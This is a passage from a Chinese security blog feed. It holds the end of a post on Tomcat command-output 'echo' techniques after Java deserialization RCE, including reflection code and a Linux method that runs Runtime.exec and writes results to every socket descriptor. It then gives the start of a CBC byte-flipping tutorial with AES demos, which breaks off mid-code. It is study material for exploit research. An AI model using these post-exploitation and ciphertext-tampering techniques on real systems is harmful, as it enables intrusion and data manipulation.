&#125;</span><br><span class="line">                        <span class="comment">//Tomcat7 这样</span></span><br><span class="line">                        outputBuffer.doWrite(byteChunk, response);</span><br><span class="line">                        <span class="comment">//Tomcat8 用这样的格式</span></span><br><span class="line">                        <span class="comment">//outputBuffer.doWrite(byteChunk);</span></span><br><span class="line">                        bufferedInputStream.close();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em><strong>ps：回显不太稳定，有一小部分时间会没有回显。估计和Tomcat的多线程有关。多刷新几次又出来了</strong></em></p><p>这里可以注意下。最终response的输出是调用<code>doWrite(ByteBuffer chunk)</code>的。其中有这么一段</p><p><em>ChunkedOutputFilter#doWrite()</em></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> result = chunk.remaining();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (result &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">.....</span><br></pre></td></tr></table></figure><p>跟进<code>chunk.remaining();</code>，能看到这样的光景：</p><p><em>Buffer#remaining()</em></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">remaining</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> rem = limit - position;</span><br><span class="line">    <span class="keyword">return</span> rem &gt; <span class="number">0</span> ? rem : <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们在进行<code>ByteBuffer.put()</code>以后，需要让字节指针归位。不然<code>Buffer#remaining()</code>返回<code>0</code></p><p>适配多版本的思路是：不同版本，有些方法参数不一样，包名不一样。我们可以通过反射来“相对动态”地调用。并加入try-catch。如果方法不存在，就说明当前Tomcat是其他版本</p><h2 id="ClassLoader拿Context"><a href="#ClassLoader拿Context" class="headerlink" title="* ClassLoader拿Context"></a>* ClassLoader拿Context</h2><p>作为一个技巧，Tomcat中<code>Servlet</code>的<code>ClassLoader</code>是<code>ParallelWebappClassLoader</code>。所以只要拿到<code>Servlet.class.getClassLoader</code>，就能拿到<code>ParallelWebappClassLoader</code>。在<code>ParallelWebappClassLoader</code>中可以通过<code>ParallelWebappClassLoader.resources.context</code>拿到<code>Context</code>，这样，内存马啊回显啊都能搞定了。</p><p><code>Thread.currentThread().getContextClassLoader()</code>可获得当前线程的<code>ClassLoader()</code>，如果该代码写在<code>Servlet</code>中或是由<code>Servlet</code>触发的话，<code>ClassLoader</code>是<code>ParallelWebappClassLoader</code></p><p>通过<code>ParallelWebappClassLoader.resources.context</code>拿到的<code>Context</code>是<code>StandardContext</code>的实例。对于回显来说，从<code>StandardContext</code>拿到真正的<code>Request</code>的路径如下:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">context.service.connectors.0.protocolHandler.handler.global.processors</span><br></pre></td></tr></table></figure><h2 id="getServletContext"><a href="#getServletContext" class="headerlink" title="* getServletContext()"></a>* getServletContext()</h2><p>在Servlet下，可以通过直接调用<code>getServletContext()</code>，获取<code>ServletContext</code>。<code>ServletContext</code>的类型是<code>ApplicationContextFacade</code>。该类型可以通过<code>context.context</code>获取<code>StandardContext</code>。从<code>StandardContext</code>获取到<code>Request</code>的路径上文有说。</p><h2 id="NioEndpoint"><a href="#NioEndpoint" class="headerlink" title="* NioEndpoint"></a>* NioEndpoint</h2><p><a href="http://wjlshare.com/archives/1549">木头师傅</a>提到的，感觉是很通用的方法。由于上文”ClassLoader拿Context”和”getServletContext()”无法在Tocmat7下使用（Tomcat7结构不同）。木头师傅找到了<code>NioEndpoint </code>类，该类的抽象父类<code>AbstractEndpoint</code>中存放着<code>handler</code>。<code>NioEndpoint</code>是<code>socket NIO poller</code>线程的主模块。可以通过遍历线程获取到<code> NioEndpoint$Poller</code>，再获取其父类<code>NioEndpoint</code>。直接得到<code>handler.global.processors</code>的路径以获取Request。</p><p>大概的代码如下，懒得测了，回显马也不常用了233,,,</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Field threadsFields = threadGroup.getClass().getDeclaredField(<span class="string">&quot;threads&quot;</span>);</span><br><span class="line">threadsFields.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Thread[] threads = (Thread[]) threadsFields.get(threadGroup);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (Thread thread : threads) &#123;</span><br><span class="line">    <span class="keyword">if</span> (thread != <span class="keyword">null</span> &amp;&amp; thread.getName().contains(<span class="string">&quot;http&quot;</span>) &amp;&amp; thread.getName().contains(<span class="string">&quot;exec&quot;</span>)) &#123;</span><br><span class="line">        Field targetField = java.lang.Thread.class.getDeclaredField(<span class="string">&quot;target&quot;</span>);</span><br><span class="line">        targetField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object target = targetField.get(thread);</span><br><span class="line">        .....</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Mapper"><a href="#Mapper" class="headerlink" title="Mapper"></a>Mapper</h2><p>翻Tomcat处理路由这一块逻辑时看到的，虚拟主机的Map类<code>MappedHost</code>是一个静态类，其成员<code>contextList</code>和<code>object</code>中存在<code>Context</code>。具体的反射拿还没试，应该是可以的。走的还是前文”ClassLoader拿Context”的老路</p><h2 id="Linux下Tomcat回显-不通用"><a href="#Linux下Tomcat回显-不通用" class="headerlink" title="Linux下Tomcat回显 - 不通用"></a>Linux下Tomcat回显 - 不通用</h2><p>思路：找socket描述符，没法确定是哪一个就依次<code>write()</code>，总会找到能<code>write()</code>的那个。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//have no request &amp; response args. Only execute command by fixed</span></span><br><span class="line"><span class="comment">//cmd</span></span><br><span class="line">InputStream cmdin = Runtime.getRuntime().exec(<span class="string">&quot;ip a&quot;</span>).getInputStream();</span><br><span class="line">String cmdRes = <span class="keyword">new</span> String(readBytesFromInputStream(cmdin, <span class="number">1024</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//通过ManagementFactory.getRuntimeMXBean()找Tomcat的PID</span></span><br><span class="line">String name = ManagementFactory.getRuntimeMXBean().getName();</span><br><span class="line">System.out.println(<span class="string">&quot;Runtime: &quot;</span> + name);</span><br><span class="line"><span class="comment">//切割，拿PID</span></span><br><span class="line">String pid = name.split(<span class="string">&quot;@&quot;</span>)[<span class="number">0</span>];</span><br><span class="line">String path = <span class="string">&quot;/proc/&quot;</span> + pid + <span class="string">&quot;/fd&quot;</span>;</span><br><span class="line">System.out.println(<span class="string">&quot;path: &quot;</span> + path);</span><br><span class="line"></span><br><span class="line"><span class="comment">//fetch所有的fd socket文件描述符</span></span><br><span class="line">String[] cmd = <span class="keyword">new</span> String[]&#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;ls -l &quot;</span> + path + <span class="string">&quot; | grep socket:&quot;</span>&#125;;</span><br><span class="line">InputStream inputStream6 = Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line"><span class="keyword">byte</span>[] bytes6 = readBytesFromInputStream(inputStream6, <span class="number">1024</span>);</span><br><span class="line">String socketFilesString = <span class="keyword">new</span> String(bytes6);</span><br><span class="line"></span><br><span class="line"><span class="comment">//split by line and fetch one by one</span></span><br><span class="line">String[] socketFilesArr = socketFilesString.split(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (String socketFile : socketFilesArr) &#123;</span><br><span class="line">    String stringLeft = socketFile.split(<span class="string">&quot; -&gt;&quot;</span>)[<span class="number">0</span>];</span><br><span class="line">    String[] socketDescriptorArr = stringLeft.split(<span class="string">&quot; &quot;</span>);</span><br><span class="line">    String socketDescriptor = socketDescriptorArr[socketDescriptorArr.length - <span class="number">1</span>];</span><br><span class="line">    <span class="comment">//compent the path</span></span><br><span class="line">    String socketDescriptorPath = path + <span class="string">&quot;/&quot;</span> + socketDescriptor;</span><br><span class="line">    System.out.println(socketDescriptorPath);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Constructor&lt;FileDescriptor&gt; fileDescriptorConstructor = FileDescriptor.class.getDeclaredConstructor(<span class="keyword">new</span> Class[]&#123;<span class="keyword">int</span>.class&#125;);</span><br><span class="line">        fileDescriptorConstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        FileDescriptor fileDescriptor = fileDescriptorConstructor.newInstance(Integer.parseInt(socketDescriptor));</span><br><span class="line">        FileOutputStream fileOutputStream = <span class="keyword">new</span> FileOutputStream(fileDescriptor);</span><br><span class="line"></span><br><span class="line">        fileOutputStream.write((<span class="string">&quot;HTTP/1 200 OK\r\n\r\n&quot;</span> + cmdRes + <span class="string">&quot;\r\n\r\n&quot;</span>).getBytes());</span><br><span class="line">        fileOutputStream.close();</span><br><span class="line">        System.out.println(<span class="string">&quot;[+] &quot;</span> + socketDescriptorPath);</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果</p><img src="/2022/07/07/2022-07-07-java-echo/2.png" style="zoom: 67%;"><p>并发太多，容易烂掉</p><img src="/2022/07/07/2022-07-07-java-echo/1.png" style="zoom: 67%;"><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://mp.weixin.qq.com/s/0fWSp71yuaxL_TkZV65EwQ">Java回显综述</a></p><p><a href="https://www.00theway.org/2020/01/17/java-god-s-eye/">通杀漏洞利用回显方法-linux平台</a></p><p><a href="https://xz.aliyun.com/t/7307">linux下java反序列化通杀回显方法的低配版实现</a></p><p><a href="https://mp.weixin.qq.com/s/SGxpWPrEm4dAi7uEcP8EKQ">Tomcat中一种半通用回显方法</a></p><p><a href="http://redteam.today/2020/04/09/tomcat%E4%B8%8D%E5%87%BA%E7%BD%91%E5%9B%9E%E6%98%BE%E8%BF%9E%E7%BB%AD%E5%89%A7%E7%AC%AC%E5%85%AD%E9%9B%86/">tomcat不出网回显连续剧第六集</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&mid=2651374294&idx=3&sn=82d050ca7268bdb7bcf7ff7ff293d7b3">基于全局储存的新思路 | Tomcat的一种通用回显方法研究</a></p><p><a href="https://man7.org/linux/man-pages/man5/proc.5.html">https://man7.org/linux/man-pages/man5/proc.5.html</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;所谓回显。根据各师傅的文章所说。现有的大多数是用defineClass 或 URLClassLoader。加载恶意类并执行。恶意类中进行例如报错、写数据、开RMI通信、等这些操作。就回显了。&lt;/p&gt;
&lt;p&gt;不，其实，涉及到内存马加载，都要用这。&lt;/p&gt;
&lt;p&gt;反序列化回显，一般都是依靠最终的代码执行点，执行到defineClass或URLClassLoader。，RCE嘛，咱想怎么操作就怎么操作。&lt;/p&gt;</summary>
    
    
    
    <category term="java" scheme="http://example.com/categories/java/"/>
    
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
    <category term="Tomcat" scheme="http://example.com/tags/Tomcat/"/>
    
    <category term="RMI" scheme="http://example.com/tags/RMI/"/>
    
  </entry>
  
  <entry>
    <title>CBC字节翻转</title>
    <link href="http://example.com/2022/05/17/2022-05-17-cbc-byte-flipping-attack/"/>
    <id>http://example.com/2022/05/17/2022-05-17-cbc-byte-flipping-attack/</id>
    <published>2022-05-17T05:30:00.000Z</published>
    <updated>2022-05-17T06:15:43.199Z</updated>
    
    <content type="html"><![CDATA[<p>又有半年没更博客233，主要是懒，笔记和文还是有写的，只不过我开了一个私密的语雀，文都放到语雀上了。现在从语雀那扒拉几篇文，丢到博客上吧。</p><span id="more"></span><p>概念</p><p>简单来说CBC是一种加密模式（我也没学太深），全称 cipher block chaining。即块加密链。</p><p>加密时，<strong>明文会按照约定的块大小，分割成各个小块，并依次加解密</strong>。如下图的加解密过程所示。图源 <a href="https://resources.infosecinstitute.com/topic/cbc-byte-flipping-attack-101-approach/">CBC byte flipping attack—101 approach</a></p><p><img src="/2022/05/17/2022-05-17-cbc-byte-flipping-attack/1.png"></p><p><img src="/2022/05/17/2022-05-17-cbc-byte-flipping-attack/2.png"></p><p>简单来说。在CBC模式中，加密一段明文，需要四要素：</p><ul><li>明文</li><li>固定块大小</li><li>加密key，长度为块大小的长度</li><li>iv - 随机生成的一串字节，长度也是块大小的长度</li></ul><p>块大小是可以指定的，常用的是16字节</p><p>加密算法如下，以块为单位（偷的<a href="https://resources.infosecinstitute.com/topic/cbc-byte-flipping-attack-101-approach/">CBC byte flipping attack—101 approach</a>）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ciphertext-0 = Encrypt(Plaintext XOR IV)</span><br><span class="line">Ciphertext-N= Encrypt(Plaintext XOR Ciphertext-N-1)</span><br></pre></td></tr></table></figure><p>第一段加密的块，加密时的参数是 <code>明文块 异或 iv</code></p><p>第二段及之后的块，加密时的参数是 <code>明文块 异或 前一段加密块</code>。即把前一段加密块当iv使。</p><p>解密算法如下，同样也是以块为单位</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Plaintext-0 = Decrypt(Ciphertext) XOR IV</span><br><span class="line"></span><br><span class="line">Plaintext-N= Decrypt(Ciphertext) XOR Ciphertext-N-1</span><br></pre></td></tr></table></figure><p>第一段解密的块，解密时的参数是 <code>密文块 异或 iv</code></p><p>第二段及之后的块，解密时的参数是 <code>密文块 异或 前一段加密块</code>。即把前一段加密块当iv使。</p><p>注意解密时异或的依然还是加密块。</p><h1 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h1><p>由于在第二段密文块及之后的密文块中，都是依据前一个密文块来做解密的。若修改了中间一个密文块的值，则解密出来的明文当然也会改变。我们便可凭借这种方式，修改前一块密文，控制下一块的密文的解密值。</p><p><img src="/2022/05/17/2022-05-17-cbc-byte-flipping-attack/3.png"></p><p><strong>Demo</strong></p><p>我们来写个简单的AES CBC加密的demo。用的块长度是16（key和iv长度保持为16即可）：</p><p><em>ps: 由于AES/CBC是前后端密文强关联，所以要求加密密文16字节对齐。Demo中用的加密模式是”NoPadding”，即不自动进行字节填充对齐，就需要我们手动将密文填充成16字节对齐的形式。”NoPadding”模式不会对字节自动填充，初学应该好理解一点。CBC字节翻转是可以对CBC的其他模式进行攻击的。</em></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    <span class="comment">// Generate PlainText, Cipher key and iv</span></span><br><span class="line">    String plainText = <span class="string">&quot;Hello World! How Are You?&quot;</span>;</span><br><span class="line">    <span class="keyword">byte</span>[] key = <span class="string">&quot;bbbbbbbbbbbbbbbb&quot;</span>.getBytes();</span><br><span class="line">    <span class="keyword">byte</span>[] iv = <span class="string">&quot;aaaaaaaaaaaaaaaa&quot;</span>.getBytes();</span><br><span class="line">    SecretKeySpec secretKeySpec = <span class="keyword">new</span> SecretKeySpec(key, <span class="string">&quot;AES&quot;</span>);</span><br><span class="line">    IvParameterSpec ivParameterSpec = <span class="keyword">new</span> IvParameterSpec(iv);</span><br><span class="line">    System.out.print(<span class="string">&quot;PlainText bytes: &quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">byte</span> aByte : plainText.getBytes()) &#123;</span><br><span class="line">        System.out.print(aByte + <span class="string">&quot; &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//encrypt</span></span><br><span class="line">    Cipher cipherEncode = Cipher.getInstance(<span class="string">&quot;AES/CBC/NoPadding&quot;</span>);</span><br><span class="line">    cipherEncode.init(<span class="number">1</span>, secretKeySpec, ivParameterSpec); <span class="comment">//1 is encode mode</span></span><br><span class="line">    <span class="keyword">byte</span>[] bytesEncode = cipherEncode.doFinal(plainText.getBytes());</span><br><span class="line">    System.out.print(<span class="string">&quot;EnCrypt bytes: &quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">byte</span> b : bytesEncode) &#123;</span><br><span class="line">        System.out.print(b + <span class="string">&quot; &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//decrypt</span></span><br><span class="line">    Cipher cipherDecode = Cipher.getInstance(<span class="string">&quot;AES/CBC/NoPadding&quot;</span>);</span><br><span class="line">    cipherDecode.init(<span class="number">2</span>, secretKeySpec, ivParameterSpec); <span class="comment">//2 is decode mode</span></span><br><span class="line">    System.out.print(<span class="string">&quot;ReDeCrypt bytes: &quot;</span>);</span><br><span class="line">    <span class="keyword">byte</span>[] bytesDecode = cipherDecode.doFinal(bytesEncode);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">byte</span> b : bytesDecode) &#123;</span><br><span class="line">        System.out.print(b + <span class="string">&quot; &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println();</span><br><span class="line">    System.out.print(<span class="keyword">new</span> String(bytesDecode));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">PlainText bytes: 72 101 108 108 111 32 87 111 114 108 100 33 32 72 111 119 32 65 114 101 32 89 111 117 63 </span><br><span class="line">PlatinText String: Hello World! How Are You?</span><br><span class="line">EnCrypt bytes: 90 40 -75 -65 -48 52 123 46 116 66 -13 -54 103 -120 5 -118 -16 97 -40 -40 -117 82 -23 31 80 7 -100 76 -78 66 -1 113 </span><br><span class="line">ReDeCrypt bytes: 72 101 108 108 111 32 87 111 114 108 100 33 32 72 111 119 32 65 114 101 32 89 111 117 63 65 65 65 65 65 65 65 </span><br><span class="line"></span><br><span class="line">----按16字节分割</span><br><span class="line">PlainText bytes:</span><br><span class="line">72 101 108 108 111 32 87 111 114 108 100 33 32 72 111 119</span><br><span class="line">32 65 114 101 32 89 111 117 63 65 65 65 65 65 65 65</span><br><span class="line"></span><br><span class="line">EnCrypt bytes:</span><br><span class="line">90 40 -75 -65 -48 52 123 46 116 66 -13 -54 103 -120 5 -118</span><br><span class="line">29 69 117 22 -89 50 112 -109 9 18 -81 -116 -7 -54 -85 52</span><br><span class="line"></span><br><span class="line">ReDeCrypt bytes:</span><br><span class="line">72 101 108 108 111 32 87 111 114 108 100 33 32 72 111 119</span><br><span class="line">32 65 114 101 32 89 111 117 63 65 65 65 65 65 65 65</span><br></pre></td></tr></table></figure><p>值得注意的是，密文字节将会按照块长度进行对齐。原文总长25，密文总长32。按16字节对齐。</p><p>根据CBC加密模式下的加密流程，第一段密文由于是受<code>iv</code>控制的，还原时<code>第一段</code>不可控。只有<code>第二段</code>及之后的密文段才可以在解密时控制。</p><p>捋一捋这一段Demo中，明文第<code>2</code>段第<code>0</code>字节的字符<code>32</code>的加解密流程：</p><ul><li>加密: 用公式<code>Ciphertext-N= Encrypt(Plaintext XOR Ciphertext-N-1)</code>，得到<code>29=encrypt(32^90)</code></li><li>解密: 用公式<code>Plaintext-N= Decrypt(Ciphertext) XOR Ciphertext-N-1</code>，得到<code>32=decrypt(29)^90</code><ul><li>解密时，忽略<code>decrypt()</code>函数，可以拆分成这样: <code>32=(32^90)^90</code></li><li><code>90^90=0</code>，则<code>32^0</code>就能还原回明文<code>32</code>了</li></ul></li></ul><p>在解密过程中，<code>decrypt()</code>调用完后会返回<code>32^90</code>。即第<code>2</code>段明文第<code>0</code>字节异或<strong>加密时</strong>第<code>1</code>段密文第<code>0</code>字节。由于这个操作读取的是加密时数据，作为攻击者角度<strong>无法控制</strong>；但后头异或的<code>90</code>，即执行<strong>解密时</strong>的第<code>1</code>段密文第<code>0</code>字节，是我们<strong>可控</strong>的，我们只需要修改传入解密函数的密文即可。</p><p>这里思考一个问题: 我们如何使得<code>32^90^XXX</code>的结果控制为任意输出呢？</p><p>我们来看个异或中的一个特性：相同字节异或，结果是<code>0</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">byte</span> a = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">byte</span> b = <span class="number">22</span>;</span><br><span class="line"><span class="keyword">byte</span> c = (<span class="keyword">byte</span>)(a^b); <span class="comment">//28</span></span><br><span class="line"><span class="keyword">byte</span> d = (<span class="keyword">byte</span>)(a^b^c); <span class="comment">//0  //我们把a^b当作一个整体，就好理解了。a^b其实就是c，c^c自然就是0</span></span><br></pre></td></tr></table></figure><p>既然<code>x^x</code>返回的结果是<code>0</code>。那如果我们控制上文这个<code>XXX</code>的值为<code>32^90</code>，不就能控制<strong>这一个字节</strong>的解密值为<code>0</code>了嘛？其中<code>32</code>和<code>90</code>这两个字节都是可预测的，一个是原始明文，一个是密文。</p><p><em>Demo:</em></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    <span class="comment">//Generate PlainText, Cipher key and iv</span></span><br><span class="line">    .....</span><br><span class="line"></span><br><span class="line">    <span class="comment">//encrypt</span></span><br><span class="line">    Cipher cipherEncode = Cipher.getInstance(<span class="string">&quot;AES/CBC/NoPadding&quot;</span>);</span><br><span class="line">    cipherEncode.init(<span class="number">1</span>, secretKeySpec, ivParameterSpec); <span class="comment">//1 is encode mode</span></span><br><span class="line">    <span class="keyword">byte</span>[] bytesEncode = cipherEncode.doFinal(plainText.getBytes());</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Change the &quot;1&quot; pos of second plain block byte to &quot;0&quot;. In the whole plainText the pos is &quot;17&quot;</span></span><br><span class="line">    bytesEncode[<span class="number">1</span>] = (<span class="keyword">byte</span>)(bytesEncode[<span class="number">1</span>] ^ plainTextBytes[<span class="number">17</span>]);  <span class="comment">//[!]</span></span><br><span class="line"></span><br><span class="line">    System.out.print(<span class="string">&quot;EnCrypt bytes: &quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">byte</span> b : bytesEncode) &#123;</span><br><span class="line">        System.out.print(b + <span class="string">&quot; &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//decrypt</span></span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>OUTPUT:</p><p>PlainText bytes: 72 101 108 108 111 32 87 111 114 108 100 33 32 72 111 119 <span style="color:red">**32 **</span>65 114 101 32 89 111 117 63 65 65 65 65 65 65 65<br>EnCrypt bytes: 90 105 -75 -65 -48 52 123 46 116 66 -13 -54 103 -120 5 -118 <span style="color:red"><strong>29</strong></span> 69 117 22 -89 50 112 -109 9 18 -81 -116 -7 -54 -85 52<br>ReDeCrypt bytes: 27 -126 -93 121 65 -48 81 -89 -14 15 62 53 -106 41 -44 86 32 <span style="color:red"><strong>0</strong></span> 114 101 32 89 111 117 63 65 65 65 65 65 65 65 </p><p>看到<code>[!]</code>这一段。我们预期修改<strong>明文</strong>下标为<code>17</code>的值为<code>0</code>。根据前面的推测可知，最终解密还原时是通过异或<strong>明文字节</strong>和<strong>加密时前一段密文字节</strong>及<strong>解密时前一段密文字节</strong>得到的。我们将<strong>解密时前一段密文字节</strong>设置为”<strong>明文字节</strong>异或<strong>加密时前一段密文字节</strong>“，即可让解密结果为<code>0</code></p><p>接下再看到异或中的一个小知识点：<code>0</code>异或任何数，结果都是那个数:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">byte</span> a = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">byte</span> b = <span class="number">22</span>;</span><br><span class="line"><span class="keyword">byte</span> c = (<span class="keyword">byte</span>)(<span class="number">0</span>^a); <span class="comment">//10</span></span><br><span class="line"><span class="keyword">byte</span> d = (<span class="keyword">byte</span>)(<span class="number">0</span>^b); <span class="comment">//22</span></span><br></pre></td></tr></table></figure><p>既然上文我们都能控制解密结果为<code>0</code>了，为何不能跟进一步，让解密结果为任意数值呢？很简单，只要我们在<code>0</code>的基础上再异或多一个数值即可。</p><p><em>Demo:</em></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    <span class="comment">//Generate PlainText, Cipher key and iv</span></span><br><span class="line">    .....</span><br><span class="line"></span><br><span class="line">    <span class="comment">//encrypt</span></span><br><span class="line">    Cipher cipherEncode = Cipher.getInstance(<span class="string">&quot;AES/CBC/NoPadding&quot;</span>);</span><br><span class="line">    cipherEncode.init(<span class="number">1</span>, secretKeySpec, ivParameterSpec); <span class="comment">//1 is encode mode</span></span><br><span class="line">    <span class="keyword">byte</span>[] bytesEncode = 